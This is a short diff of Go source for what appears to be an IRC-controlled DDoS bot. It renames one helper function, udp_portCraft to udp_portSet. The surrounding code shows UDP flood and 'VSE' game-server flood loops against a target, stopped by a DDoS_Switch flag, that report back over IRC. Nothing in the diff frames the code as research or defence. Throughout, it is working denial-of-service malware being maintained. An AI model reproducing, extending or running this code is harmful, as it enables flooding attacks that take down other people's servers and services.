@@ -62,7 +62,7 @@ func POST(postTarget, set_chan string, reportIRC net.Conn) {
 	}
 }
 
-func udp_portCraft(port string) string { return port }
+func udp_portSet(port string) string { return port }
 
 func udp_packetCraft(udpTarget, size, set_chan, port string, reportIRC net.Conn) {
 	_size, _ := strconv.Atoi(size)
@@ -80,7 +80,7 @@ func udp_packetCraft(udpTarget, size, set_chan, port string, reportIRC net.Conn)
 
 func UDP(udpTarget, size, set_chan string, reportIRC net.Conn) {
 	for {
-		udp_packetCraft(udpTarget, size, set_chan, udp_portCraft(fmt.Sprint(rand.Intn(65535))), reportIRC)
+		udp_packetCraft(udpTarget, size, set_chan, udp_portSet(fmt.Sprint(rand.Intn(65535))), reportIRC)
 		if DDoS_Switch {
 			break
 		}
@@ -89,7 +89,7 @@ func UDP(udpTarget, size, set_chan string, reportIRC net.Conn) {
 
 func VSE(vseTarget, size, set_chan string, reportIRC net.Conn) {
 	for {
-		udp_packetCraft(vseTarget, size, set_chan, udp_portCraft("27015"), reportIRC)
+		udp_packetCraft(vseTarget, size, set_chan, udp_portSet("27015"), reportIRC)
 		if DDoS_Switch {
 			break
 		}
